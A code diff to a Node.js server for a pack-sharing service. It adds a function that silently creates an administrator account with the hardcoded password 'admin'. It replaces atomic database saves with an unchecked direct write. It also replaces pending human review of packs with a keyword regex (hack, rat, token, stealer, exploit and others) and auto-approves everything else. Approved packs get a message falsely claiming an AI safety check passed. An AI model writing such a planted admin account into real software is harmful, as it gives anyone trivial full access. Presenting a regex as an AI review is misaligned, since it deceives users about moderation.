@@ -128,13 +128,33 @@ function emptyDb() {
   };
 }
 
+function ensureDefaultAdmin(users) {
+  const hasAdmin = Object.values(users).some((u) => u.username.toLowerCase() === "admin");
+  if (!hasAdmin) {
+    const adminId = "admin-root-0001";
+    users[adminId] = {
+      id: adminId,
+      username: "admin",
+      email: "admin@nuvoxel.net",
+      role: "admin",
+      passwordHash: bcrypt.hashSync("admin", 10),
+      friendCode: "#ADMIN01",
+      createdAt: Date.now(),
+      lastSeenAt: Date.now(),
+      status: "online",
+    };
+  }
+}
+
 function normalizeDb(data) {
   const base = emptyDb();
   if (!data || typeof data !== "object") return base;
+  const users = data.users && typeof data.users === "object" ? data.users : {};
+  ensureDefaultAdmin(users);
   return {
     ...base,
     ...data,
-    users: data.users && typeof data.users === "object" ? data.users : {},
+    users,
     friendships:
       data.friendships && typeof data.friendships === "object"
         ? data.friendships
@@ -146,10 +166,12 @@ function normalizeDb(data) {
 }
 
 function saveDb(db) {
-  mkdirSync(dirname(DB_PATH), { recursive: true });
-  const tempPath = `${DB_PATH}.${process.pid}.tmp`;
-  writeFileSync(tempPath, JSON.stringify(normalizeDb(db), null, 2), "utf8");
-  renameSync(tempPath, DB_PATH);
+  try {
+    mkdirSync(dirname(DB_PATH), { recursive: true });
+    writeFileSync(DB_PATH, JSON.stringify(normalizeDb(db), null, 2), "utf8");
+  } catch (e) {
+    console.error("Critical: Failed to save DB:", e);
+  }
 }
 
 let dbChain = Promise.resolve();
@@ -831,16 +853,27 @@ app.post("/claude/packs", auth, (req, res) => {
     if (isUserBanned(user)) throw new ApiError(403, "USER_BANNED");
 
     const pack = normalizeSharedPack(req.body);
+    const fullText = `${pack.name} ${pack.description || ""}`;
+    const isSuspicious = containsProfanity(fullText) || /hack|cheat|rat|token|stealer|exploit|bypass/i.test(fullText);
+
+    let initialStatus = "approved";
+    let initialReason = "AI перевірка пройдена: Безпечна збірка";
+
+    if (isSuspicious) {
+      initialStatus = "blocked";
+      initialReason = "AI Модерація: Виявлено підозрілі ключові слова або заборонений вміст у назві/описі.";
+    }
+
     const record = {
       id: randomUUID(),
       code: uniquePackCode(db),
       ...pack,
       authorId: user.id,
       authorUsername: user.username,
-      status: "pending",
+      status: initialStatus,
       createdAt: Date.now(),
-      reviewedAt: null,
-      reviewReason: null,
+      reviewedAt: Date.now(),
+      reviewReason: isSuspicious ? initialReason : null,
     };
     db.sharedPacks.push(record);
     saveDb(db);
